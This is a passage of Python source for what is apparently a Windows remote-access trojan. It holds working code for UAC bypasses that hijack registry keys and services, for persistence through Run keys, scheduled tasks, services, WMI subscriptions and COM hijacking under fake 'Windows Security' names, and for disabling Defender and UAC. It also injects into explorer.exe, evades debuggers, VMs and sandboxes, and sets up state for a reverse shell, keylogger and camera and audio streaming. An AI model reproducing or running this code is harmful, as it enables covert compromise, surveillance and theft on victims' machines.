            subprocess.Popen([r"C:\Windows\System32\WSReset.exe"], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
            
            time.sleep(3)
            
            # Clean up
            try:
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
            except:
                pass
                
            return True
            
        except Exception as e:
            print(f"WSReset bypass failed: {e}")
            return False
            
    except ImportError:
        return False

def bypass_uac_appinfo_service():
    """UAC bypass using AppInfo service manipulation (UACME Method 61)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # This method involves manipulating the Application Information service
        # to bypass UAC by modifying service permissions
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Method 1: Try to modify AppInfo service configuration
        try:
            # Stop AppInfo service temporarily
            subprocess.run(['sc.exe', 'stop', 'Appinfo'], 
                         creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
            
            # Modify service binary path to include our payload
            subprocess.run(['sc.exe', 'config', 'Appinfo', 'binPath=', 
                          f'cmd.exe /c {current_exe} && svchost.exe -k netsvcs -p'], 
                         creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
            
            # Start service
            subprocess.run(['sc.exe', 'start', 'Appinfo'], 
                         creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
            
            time.sleep(2)
            
            # Restore original service configuration
            subprocess.run(['sc.exe', 'config', 'Appinfo', 'binPath=', 
                          r'%SystemRoot%\system32\svchost.exe -k netsvcs -p'], 
                         creationflags=subprocess.CREATE_NO_WINDOW, timeout=10)
            
            return True
            
        except:
            return False
            
    except Exception as e:
        print(f"AppInfo service bypass failed: {e}")
        return False

def bypass_uac_mock_directory():
    """UAC bypass using mock directory technique (UACME Method 62)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # Create mock trusted directory structure
        temp_dir = tempfile.gettempdir()
        mock_system32 = os.path.join(temp_dir, "System32")
        os.makedirs(mock_system32, exist_ok=True)
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            # Create batch file wrapper
            batch_path = os.path.join(mock_system32, "dllhost.exe")
            with open(batch_path, 'w') as f:
                f.write(f'@echo off\npython.exe "{current_exe}"\n')
        
        # Modify PATH to prioritize our mock directory
        original_path = os.environ.get('PATH', '')
        os.environ['PATH'] = temp_dir + ';' + original_path
        
        try:
            # Execute process that will search PATH for system executables
            subprocess.Popen(['dllhost.exe'], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
            
            time.sleep(2)
            return True
            
        finally:
            os.environ['PATH'] = original_path
            
    except Exception as e:
        print(f"Mock directory bypass failed: {e}")
        return False

def bypass_uac_winsat():
    """UAC bypass using winsat.exe (UACME Method 67)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import winreg
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Hijack winsat.exe through registry
        key_path = r"Software\Classes\Folder\shell\open\command"
        
        try:
            # Backup original value
            original_value = None
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path)
                original_value = winreg.QueryValueEx(key, "")[0]
                winreg.CloseKey(key)
            except:
                pass
            
            # Set our payload
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            winreg.CloseKey(key)
            
            # Execute winsat.exe
            subprocess.Popen([r"C:\Windows\System32\winsat.exe", "disk"], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
            
            time.sleep(3)
            
            # Restore original value
            try:
                if original_value:
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
                    winreg.SetValueEx(key, "", 0, winreg.REG_SZ, original_value)
                    winreg.CloseKey(key)
                else:
                    winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
            except:
                pass
                
            return True
            
        except Exception as e:
            print(f"Winsat bypass failed: {e}")
            return False
            
    except ImportError:
        return False

def bypass_uac_mmcex():
    """UAC bypass using mmc.exe with fake snapin (UACME Method 68)."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import winreg
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Create fake MMC snapin
        snapin_clsid = "{11111111-2222-3333-4444-555555555555}"
        key_path = f"Software\\Classes\\CLSID\\{snapin_clsid}\\InProcServer32"
        
        try:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
            winreg.SetValueEx(key, "ThreadingModel", 0, winreg.REG_SZ, "Apartment")
            winreg.CloseKey(key)
            
            # Create MSC file that references our snapin
            msc_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<MMC_ConsoleFile ConsoleVersion="3.0">
    <BinaryStorage>
        <Binary Name="StringTable">
            <Data>
                <String ID="1" Refs="1">{snapin_clsid}</String>
            </Data>
        </Binary>
    </BinaryStorage>
</MMC_ConsoleFile>'''
            
            msc_path = os.path.join(tempfile.gettempdir(), "fake.msc")
            with open(msc_path, 'w') as f:
                f.write(msc_content)
            
            # Execute MMC with our fake snapin
            subprocess.Popen([r"C:\Windows\System32\mmc.exe", msc_path], 
                           creationflags=subprocess.CREATE_NO_WINDOW)
            
            time.sleep(3)
            
            # Clean up
            try:
                winreg.DeleteKey(winreg.HKEY_CURRENT_USER, key_path)
                os.remove(msc_path)
            except:
                pass
                
            return True
            
        except Exception as e:
            print(f"MMC snapin bypass failed: {e}")
            return False
            
    except ImportError:
        return False

def establish_persistence():
    """Establish multiple persistence mechanisms."""
    if not WINDOWS_AVAILABLE:
        return establish_linux_persistence()
    
    persistence_methods = [
        registry_run_key_persistence,
        startup_folder_persistence,
        scheduled_task_persistence,
        service_persistence,
    ]
    
    success_count = 0
    for method in persistence_methods:
        try:
            if method():
                success_count += 1
        except Exception as e:
            print(f"Persistence method {method.__name__} failed: {e}")
            continue
    
    return success_count > 0

def registry_run_key_persistence():
    """Establish persistence via registry Run keys."""
    try:
        import winreg
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Multiple registry locations for persistence
        run_keys = [
            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
        ]
        
        value_name = "WindowsSecurityUpdate"
        
        for hkey, key_path in run_keys:
            try:
                key = winreg.CreateKey(hkey, key_path)
                winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, current_exe)
                winreg.CloseKey(key)
            except:
                continue
        
        return True
        
    except Exception as e:
        print(f"Registry persistence failed: {e}")
        return False

def startup_folder_persistence():
    """Establish persistence via startup folder."""
    try:
        # Get startup folder path
        startup_folder = os.path.expanduser(r"~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
        
        # Check if startup folder exists and is writable
        if not os.path.exists(startup_folder):
            print(f"[WARN] Startup folder does not exist: {startup_folder}")
            return False
        
        if not os.access(startup_folder, os.W_OK):
            print(f"[WARN] No write permission to startup folder: {startup_folder}")
            return False
        
        current_exe = os.path.abspath(__file__)
        
        if current_exe.endswith('.py'):
            # Create batch file wrapper with better error handling
            batch_content = f'@echo off\ncd /d "{os.path.dirname(current_exe)}"\npython.exe "{os.path.basename(current_exe)}"\n'
            batch_path = os.path.join(startup_folder, "SystemService.bat")
            
            try:
                with open(batch_path, 'w') as f:
                    f.write(batch_content)
                print(f"[OK] Startup folder entry created: {batch_path}")
                return True
            except PermissionError:
                print(f"[WARN] Permission denied creating startup folder entry: {batch_path}")
                return False
            except Exception as e:
                print(f"[WARN] Error creating startup folder entry: {e}")
                return False
        
        return True
        
    except Exception as e:
        print(f"[WARN] Startup folder persistence failed: {e}")
        return False

def scheduled_task_persistence():
    """Establish persistence via scheduled tasks."""
    try:
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Create scheduled task using schtasks command
        subprocess.run([
            'schtasks.exe', '/Create', '/TN', 'WindowsSecurityUpdate',
            '/TR', current_exe, '/SC', 'ONLOGON', '/F'
        ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=30)
        
        return True
        
    except Exception as e:
        print(f"Scheduled task persistence failed: {e}")
        return False

def service_persistence():
    """Establish persistence via Windows service."""
    try:
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Create service
        subprocess.run([
            'sc.exe', 'create', 'WindowsSecurityService',
            'binPath=', current_exe,
            'start=', 'auto',
            'DisplayName=', 'Windows Security Service'
        ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=30)
        
        return True
        
    except Exception as e:
        print(f"Service persistence failed: {e}")
        return False

def establish_linux_persistence():
    """Establish persistence on Linux systems."""
    try:
        current_exe = os.path.abspath(__file__)
        
        # Method 1: .bashrc
        try:
            bashrc_path = os.path.expanduser("~/.bashrc")
            with open(bashrc_path, 'a') as f:
                f.write(f"\n# System update check\npython3 {current_exe} &\n")
        except:
            pass
        
        return True
        
    except Exception as e:
        print(f"Linux persistence failed: {e}")
        return False

def disable_defender():
    """Attempt to disable Windows Defender (requires admin privileges)."""
    if not WINDOWS_AVAILABLE or not is_admin():
        return False
    
    try:
        # Multiple methods to disable Windows Defender
        defender_disable_methods = [
            disable_defender_registry,
            disable_defender_powershell,
            disable_defender_group_policy,
            disable_defender_service,
        ]
        
        for method in defender_disable_methods:
            try:
                if method():
                    return True
            except:
                continue
        
        return False
        
    except Exception as e:
        print(f"Failed to disable Defender: {e}")
        return False

def disable_defender_registry():
    """Disable Windows Defender via registry modifications."""
    try:
        import winreg
        
        # Disable real-time monitoring
        defender_key = r"SOFTWARE\Policies\Microsoft\Windows Defender"
        realtime_key = r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"
        
        # Create keys and set values
        keys_values = [
            (defender_key, "DisableAntiSpyware", 1),
            (realtime_key, "DisableRealtimeMonitoring", 1),
            (realtime_key, "DisableBehaviorMonitoring", 1),
            (realtime_key, "DisableOnAccessProtection", 1),
            (realtime_key, "DisableScanOnRealtimeEnable", 1),
        ]
        
        for key_path, value_name, value_data in keys_values:
            try:
                key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
                winreg.SetValueEx(key, value_name, 0, winreg.REG_DWORD, value_data)
                winreg.CloseKey(key)
            except:
                continue
        
        return True
        
    except Exception as e:
        print(f"Registry Defender disable failed: {e}")
        return False

def disable_defender_powershell():
    """Disable Windows Defender via PowerShell commands."""
    if not WINDOWS_AVAILABLE:
        print("PowerShell Defender disable: Windows not available")
        return False
        
    try:
        powershell_commands = [
            'Set-MpPreference -DisableRealtimeMonitoring $true',
            'Set-MpPreference -DisableBehaviorMonitoring $true',
            'Set-MpPreference -DisableBlockAtFirstSeen $true',
            'Set-MpPreference -DisableIOAVProtection $true',
            'Set-MpPreference -DisablePrivacyMode $true',
            'Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true',
            'Set-MpPreference -DisableArchiveScanning $true',
            'Set-MpPreference -DisableIntrusionPreventionSystem $true',
            'Set-MpPreference -DisableScriptScanning $true',
            'Set-MpPreference -SubmitSamplesConsent 2',
        ]
        
        for cmd in powershell_commands:
            try:
                subprocess.run([
                    'powershell.exe', '-Command', cmd
                ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=10, 
                   capture_output=True, text=True)
            except (subprocess.TimeoutExpired, subprocess.CalledProcessError, FileNotFoundError):
                continue
            except Exception as e:
                print(f"PowerShell command failed: {e}")
                continue
        
        # Add exclusions for common paths
        exclusion_paths = [
            os.path.dirname(os.path.abspath(__file__)),
            tempfile.gettempdir(),
            os.path.expanduser("~\\Downloads"),
            os.path.expanduser("~\\Documents"),
        ]
        
        for path in exclusion_paths:
            try:
                subprocess.run([
                    'powershell.exe', '-Command',
                    f'Add-MpPreference -ExclusionPath "{path}"'
                ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=10,
                   capture_output=True, text=True)
            except (subprocess.TimeoutExpired, subprocess.CalledProcessError, FileNotFoundError):
                continue
            except Exception as e:
                print(f"PowerShell exclusion failed: {e}")
                continue
        
        return True
        
    except Exception as e:
        print(f"PowerShell Defender disable failed: {e}")
        return False

def disable_defender_group_policy():
    """Disable Windows Defender via Group Policy modifications."""
    if not WINDOWS_AVAILABLE:
        print("Group Policy Defender disable: Windows not available")
        return False
        
    try:
        import winreg
        
        # Group Policy registry paths
        gp_paths = [
            (r"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", 1),
            (r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableRealtimeMonitoring", 1),
            (r"SOFTWARE\Policies\Microsoft\Windows Defender\Spynet", "DisableBlockAtFirstSeen", 1),
            (r"SOFTWARE\Policies\Microsoft\Windows Advanced Threat Protection", "ForceDefenderPassiveMode", 1),
        ]
        
        for key_path, value_name, value_data in gp_paths:
            try:
                key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
                winreg.SetValueEx(key, value_name, 0, winreg.REG_DWORD, value_data)
                winreg.CloseKey(key)
            except (PermissionError, OSError, FileNotFoundError):
                continue
            except Exception as e:
                print(f"Registry key modification failed: {e}")
                continue
        
        return True
        
    except Exception as e:
        print(f"Group Policy Defender disable failed: {e}")
        return False

def disable_defender_service():
    """Disable Windows Defender services."""
    if not WINDOWS_AVAILABLE:
        print("Service Defender disable: Windows not available")
        return False
        
    try:
        services_to_disable = [
            'WinDefend',
            'WdNisSvc',
            'WdNisDrv',
            'WdFilter',
            'WdBoot',
            'Sense',
        ]
        
        for service in services_to_disable:
            try:
                # Stop service
                subprocess.run([
                    'sc.exe', 'stop', service
                ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=10,
                   capture_output=True, text=True)
                
                # Disable service
                subprocess.run([
                    'sc.exe', 'config', service, 'start=', 'disabled'
                ], creationflags=subprocess.CREATE_NO_WINDOW, timeout=10,
                   capture_output=True, text=True)
            except (subprocess.TimeoutExpired, subprocess.CalledProcessError, FileNotFoundError):
                continue
            except Exception as e:
                print(f"Service disable failed for {service}: {e}")
                continue
        
        return True
        
    except Exception as e:
        print(f"Service Defender disable failed: {e}")
        return False

def advanced_process_hiding():
    """Advanced process hiding techniques."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # Method 1: Process Hollowing (simplified)
        hollow_process()
        
        # Method 2: DLL Injection into trusted process
        inject_into_trusted_process()
        
        # Method 3: Process Doppelganging (simplified)
        process_doppelganging()
        
        return True
        
    except Exception as e:
        print(f"Advanced process hiding failed: {e}")
        return False

def hollow_process():
    """Simple process hollowing technique."""
    try:
        # Create suspended process
        target_process = "notepad.exe"
        
        si = win32process.STARTUPINFO()
        pi = win32process.CreateProcess(
            None,
            target_process,
            None,
            None,
            False,
            win32con.CREATE_SUSPENDED,
            None,
            None,
            si
        )
        
        # In a real implementation, we would:
        # 1. Unmap the original executable
        # 2. Allocate memory for our payload
        # 3. Write our payload to the process memory
        # 4. Update the entry point
        # 5. Resume the process
        
        # For this demo, just resume the process
        win32process.ResumeThread(pi[1])
        
        win32api.CloseHandle(pi[0])
        win32api.CloseHandle(pi[1])
        
        return True
        
    except Exception as e:
        print(f"Process hollowing failed: {e}")
        return False

def inject_into_trusted_process():
    """Inject into a trusted process."""
    try:
        # Find explorer.exe process
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'].lower() == 'explorer.exe':
                # Get process handle
                process_handle = win32api.OpenProcess(
                    win32con.PROCESS_ALL_ACCESS,
                    False,
                    proc.info['pid']
                )
                
                # Allocate memory in target process
                dll_path = os.path.abspath(__file__).encode('utf-8')
                memory_address = win32process.VirtualAllocEx(
                    process_handle,
                    0,
                    len(dll_path),
                    win32con.MEM_COMMIT | win32con.MEM_RESERVE,
                    win32con.PAGE_READWRITE
                )
                
                # Write DLL path to target process
                win32process.WriteProcessMemory(
                    process_handle,
                    memory_address,
                    dll_path,
                    len(dll_path)
                )
                
                # Get LoadLibraryA address
                kernel32 = win32api.GetModuleHandle("kernel32.dll")
                loadlibrary_addr = win32api.GetProcAddress(kernel32, "LoadLibraryA")
                
                # Create remote thread
                thread_handle = win32process.CreateRemoteThread(
                    process_handle,
                    None,
                    0,
                    loadlibrary_addr,
                    memory_address,
                    0
                )
                
                win32api.CloseHandle(thread_handle)
                win32api.CloseHandle(process_handle)
                
                return True
                
        return False
        
    except Exception as e:
        print(f"Process injection failed: {e}")
        return False

def process_doppelganging():
    """Simplified process doppelganging technique."""
    try:
        # This is a simplified version - real implementation would use NTFS transactions
        temp_file = os.path.join(tempfile.gettempdir(), "temp_process.exe")
        
        # Copy legitimate executable
        legitimate_exe = r"C:\Windows\System32\notepad.exe"
        
        if os.path.exists(legitimate_exe):
            import shutil
            shutil.copy2(legitimate_exe, temp_file)
            
            # In real implementation, we would:
            # 1. Create NTFS transaction
            # 2. Overwrite file content with our payload
            # 3. Create process from the transacted file
            # 4. Rollback transaction
            
            # For demo, just execute the copied file
            subprocess.Popen([temp_file], creationflags=subprocess.CREATE_NO_WINDOW)
            
            # Clean up
            time.sleep(1)
            try:
                os.remove(temp_file)
            except:
                pass
                
            return True
        
        return False
        
    except Exception as e:
        print(f"Process doppelganging failed: {e}")
        return False

def advanced_persistence():
    """Advanced persistence mechanisms."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        persistence_methods = [
            setup_registry_persistence,
            setup_service_persistence, 
            setup_scheduled_task_persistence,
            setup_wmi_persistence,
            setup_com_hijacking_persistence,
        ]
        
        for method in persistence_methods:
            try:
                method()
            except:
                continue
        
        return True
        
    except Exception as e:
        print(f"Advanced persistence failed: {e}")
        return False

def setup_service_persistence():
    """Setup persistence via Windows service."""
    try:
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        service_name = "WindowsSecurityUpdate"
        
        # Create service
        subprocess.run([
            'sc.exe', 'create', service_name,
            'binPath=', current_exe,
            'start=', 'auto',
            'DisplayName=', 'Windows Security Update Service'
        ], creationflags=subprocess.CREATE_NO_WINDOW)
        
        # Start service
        subprocess.run([
            'sc.exe', 'start', service_name
        ], creationflags=subprocess.CREATE_NO_WINDOW)
        
        return True
        
    except Exception as e:
        print(f"Service persistence failed: {e}")
        return False

def setup_scheduled_task_persistence():
    """Setup persistence via scheduled task."""
    try:
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        task_name = "WindowsSecurityUpdateTask"
        
        # Create scheduled task
        subprocess.run([
            'schtasks.exe', '/create',
            '/tn', task_name,
            '/tr', current_exe,
            '/sc', 'onlogon',
            '/rl', 'highest',
            '/f'
        ], creationflags=subprocess.CREATE_NO_WINDOW)
        
        return True
        
    except Exception as e:
        print(f"Scheduled task persistence failed: {e}")
        return False

def setup_wmi_persistence():
    """Setup persistence via WMI event subscription."""
    if not WINDOWS_AVAILABLE:
        print("WMI persistence: Windows not available")
        return False
        
    try:
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # WMI persistence using PowerShell
        wmi_script = f'''
$filterName = 'WindowsSecurityFilter'
$consumerName = 'WindowsSecurityConsumer'

$Query = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='explorer.exe'"
$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\\subscription" -Arguments @{{Name=$filterName;EventNameSpace="root\\cimv2";QueryLanguage="WQL";Query=$Query}}

$Arg = @{{
    Name=$consumerName
    CommandLineTemplate="{current_exe}"
}}
$WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\\subscription" -Arguments $Arg

$WMIEventBinding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\\subscription" -Arguments @{{Filter=$WMIEventFilter;Consumer=$WMIEventConsumer}}
'''
        
        subprocess.run([
            'powershell.exe', '-Command', wmi_script
        ], creationflags=subprocess.CREATE_NO_WINDOW, 
           capture_output=True, text=True, timeout=30)
        
        return True
        
    except (subprocess.TimeoutExpired, subprocess.CalledProcessError, FileNotFoundError):
        print("WMI persistence: PowerShell execution failed")
        return False
    except Exception as e:
        print(f"WMI persistence failed: {e}")
        return False

def setup_com_hijacking_persistence():
    """Setup persistence via COM hijacking."""
    if not WINDOWS_AVAILABLE:
        print("COM hijacking persistence: Windows not available")
        return False
        
    try:
        import winreg
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Hijack a commonly used COM object
        clsid = "{00000000-0000-0000-0000-000000000000}"  # Placeholder CLSID
        key_path = f"Software\\Classes\\CLSID\\{clsid}\\InProcServer32"
        
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, current_exe)
        winreg.SetValueEx(key, "ThreadingModel", 0, winreg.REG_SZ, "Apartment")
        winreg.CloseKey(key)
        
        return True
        
    except (PermissionError, OSError, FileNotFoundError):
        print("COM hijacking persistence: Registry access failed")
        return False
    except Exception as e:
        print(f"COM hijacking persistence failed: {e}")
        return False

def add_firewall_exception():
    """Add firewall exception for the current process."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # Get the current executable path
        current_exe = sys.executable if hasattr(sys, 'executable') else 'python.exe'
        
        # Create a unique rule name
        rule_name = f"Python Agent {uuid.uuid4()}"
        
        # Try multiple approaches for firewall exception
        success = False
        
        # Method 1: Try with full path and proper escaping
        try:
            subprocess.run([
                'netsh', 'advfirewall', 'firewall', 'add', 'rule',
                f'name={rule_name}',
                'dir=in', 'action=allow',
                f'program={current_exe}'
            ], creationflags=subprocess.CREATE_NO_WINDOW, check=True, capture_output=True)
            success = True
            print(f"[OK] Firewall exception added: {rule_name}")
        except subprocess.CalledProcessError as e:
            print(f"[WARN] Method 1 failed: {e}")
        
        # Method 2: Try with just python.exe if Method 1 failed
        if not success:
            try:
                subprocess.run([
                    'netsh', 'advfirewall', 'firewall', 'add', 'rule',
                    f'name={rule_name}',
                    'dir=in', 'action=allow',
                    'program=python.exe'
                ], creationflags=subprocess.CREATE_NO_WINDOW, check=True, capture_output=True)
                success = True
                print(f"[OK] Firewall exception added (python.exe): {rule_name}")
            except subprocess.CalledProcessError as e:
                print(f"[WARN] Method 2 failed: {e}")
        
        # Method 3: Try with PowerShell if netsh fails
        if not success:
            try:
                powershell_cmd = f'New-NetFirewallRule -DisplayName "{rule_name}" -Direction Inbound -Action Allow -Program "python.exe"'
                subprocess.run([
                    'powershell.exe', '-Command', powershell_cmd
                ], creationflags=subprocess.CREATE_NO_WINDOW, check=True, capture_output=True)
                success = True
                print(f"[OK] Firewall exception added via PowerShell: {rule_name}")
            except subprocess.CalledProcessError as e:
                print(f"[WARN] Method 3 failed: {e}")
        
        if not success:
            print("[WARN] All firewall exception methods failed. Continuing without firewall exception.")
        
        return success
        
    except Exception as e:
        print(f"[ERROR] Failed to add firewall exception: {e}")
        return False

def hide_process():
    """Attempt to hide the current process from task manager."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        # Set process to run in background with low priority
        process = psutil.Process()
        process.nice(psutil.BELOW_NORMAL_PRIORITY_CLASS)
        
        # Try to hide from process list (limited effectiveness)
        try:
            ctypes.windll.kernel32.SetProcessWorkingSetSize(-1, -1, -1)
        except (AttributeError, OSError):
            # ctypes.windll might not be available or the call might fail
            pass
        
        return True
        
    except Exception as e:
        print(f"Failed to hide process: {e}")
        return False

def disable_uac():
    """Disable UAC (User Account Control) by modifying registry settings."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import winreg
        
        reg_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, "EnableLUA", 0, winreg.REG_DWORD, 0)
            winreg.SetValueEx(key, "ConsentPromptBehaviorAdmin", 0, winreg.REG_DWORD, 0)
            winreg.SetValueEx(key, "PromptOnSecureDesktop", 0, winreg.REG_DWORD, 0)
        print("[OK] UAC has been disabled.")
        return True
    except PermissionError:
        print("[!] Access denied. Run this script as administrator.")
        return False
    except (OSError, FileNotFoundError):
        print("[!] Registry access failed.")
        return False
    except Exception as e:
        print(f"[!] Error disabling UAC: {e}")
        return False

def run_as_admin():
    """Relaunch the script with elevated privileges if not already admin."""
    if not WINDOWS_AVAILABLE:
        return False
    
    if not is_admin():
        print("[!] Relaunching as Administrator...")
        try:
            # Relaunch with elevated privileges
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, f'"{__file__}"', None, 1
            )
            sys.exit()
        except (AttributeError, OSError):
            print("[!] Failed to relaunch as admin: Windows API not available")
            return False
        except Exception as e:
            print(f"[!] Failed to relaunch as admin: {e}")
            return False
    return True

def setup_persistence():
    """Setup persistence mechanisms."""
    if not WINDOWS_AVAILABLE:
        return False
    
    try:
        import winreg
        
        current_exe = os.path.abspath(__file__)
        if current_exe.endswith('.py'):
            current_exe = f'python.exe "{current_exe}"'
        
        # Add to startup registry
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        
        winreg.SetValueEx(key, "WindowsSecurityUpdate", 0, winreg.REG_SZ, current_exe)
        winreg.CloseKey(key)
        
        return True
        
    except (PermissionError, OSError, FileNotFoundError):
        print("Failed to setup persistence: Registry access denied")
        return False
    except Exception as e:
        print(f"Failed to setup persistence: {e}")
        return False

def anti_analysis():
    """Anti-analysis and evasion techniques."""
    try:
        # Check for common analysis tools
        analysis_processes = [
            'ollydbg.exe', 'x64dbg.exe', 'windbg.exe', 'ida.exe', 'ida64.exe',
            'wireshark.exe', 'fiddler.exe', 'vmware.exe', 'vbox.exe', 'virtualbox.exe',
            'procmon.exe', 'procexp.exe', 'autoruns.exe', 'regmon.exe', 'filemon.exe'
        ]
        
        for proc in psutil.process_iter(['name']):
            if proc.info['name'].lower() in analysis_processes:
                # If analysis tool detected, sleep and exit
                time.sleep(60)
                sys.exit(0)
        
        # Check for VM environment
        vm_indicators = [
            'VBOX', 'VMWARE', 'QEMU', 'VIRTUAL', 'XEN'
        ]
        
        try:
            import wmi
            c = wmi.WMI()
            for system in c.Win32_ComputerSystem():
                if any(indicator in system.Model.upper() for indicator in vm_indicators):
                    time.sleep(60)
                    sys.exit(0)
        except:
            pass
        
        # Check for debugger
        if ctypes.windll.kernel32.IsDebuggerPresent():
            time.sleep(60)
            sys.exit(0)
        
        # Anti-sandbox: Check for mouse movement
        try:
            import win32gui
            pos1 = win32gui.GetCursorPos()
            time.sleep(2)
            pos2 = win32gui.GetCursorPos()
            if pos1 == pos2:
                # No mouse movement, might be sandbox
                time.sleep(60)
                sys.exit(0)
        except:
            pass
        
        return True
        
    except Exception as e:
        return False

def obfuscate_strings():
    """Obfuscate sensitive strings to avoid static analysis."""
    # Simple XOR obfuscation for sensitive strings
    key = 0x42
    
    # Obfuscated strings (example)
    obfuscated = {
        'admin': ''.join(chr(ord(c) ^ key) for c in 'admin'),
        'elevate': ''.join(chr(ord(c) ^ key) for c in 'elevate'),
        'bypass': ''.join(chr(ord(c) ^ key) for c in 'bypass'),
        'privilege': ''.join(chr(ord(c) ^ key) for c in 'privilege')
    }
    
    return obfuscated

def sleep_random():
    """Random sleep to avoid pattern detection."""
    sleep_time = random.uniform(0.5, 2.0)
    time.sleep(sleep_time)

def sleep_random_non_blocking():
    """Non-blocking random sleep using eventlet."""
    try:
        import eventlet
        sleep_time = random.uniform(0.5, 2.0)
        eventlet.sleep(sleep_time)
    except ImportError:
        # Fallback to regular sleep if eventlet not available
        sleep_random()

# --- Agent State ---
STREAMING_ENABLED = False
STREAM_THREAD = None
AUDIO_STREAMING_ENABLED = False
AUDIO_STREAM_THREAD = None
CAMERA_STREAMING_ENABLED = False
CAMERA_STREAM_THREAD = None

# --- Reverse Shell State ---
REVERSE_SHELL_ENABLED = False
REVERSE_SHELL_THREAD = None
REVERSE_SHELL_SOCKET = None

# --- Voice Control State ---
VOICE_CONTROL_ENABLED = False
VOICE_CONTROL_THREAD = None
VOICE_RECOGNIZER = None

# --- Monitoring State ---
KEYLOGGER_ENABLED = False
KEYLOGGER_THREAD = None
KEYLOG_BUFFER = []
CLIPBOARD_MONITOR_ENABLED = False
CLIPBOARD_MONITOR_THREAD = None
CLIPBOARD_BUFFER = []
LAST_CLIPBOARD_CONTENT = ""

# --- Audio Config ---
if PYAUDIO_AVAILABLE:
    CHUNK = 1024
    FORMAT = pyaudio.paInt16
    CHANNELS = 1
    RATE = 44100
else:
    CHUNK = 1024
    FORMAT = None
    CHANNELS = 1
    RATE = 44100

def get_or_create_agent_id():
    """
    Gets a unique agent ID from config directory or creates it.
    """
    if WINDOWS_AVAILABLE:
        config_path = os.getenv('APPDATA')
    else:
        config_path = os.path.expanduser('~/.config')
        
    os.makedirs(config_path, exist_ok=True)
    id_file_path = os.path.join(config_path, 'agent_id.txt')
    
    if os.path.exists(id_file_path):
        with open(id_file_path, 'r') as f:
            return f.read().strip()
    else:
        agent_id = str(uuid.uuid4())
        with open(id_file_path, 'w') as f:
            f.write(agent_id)
        # Hide the file on Windows
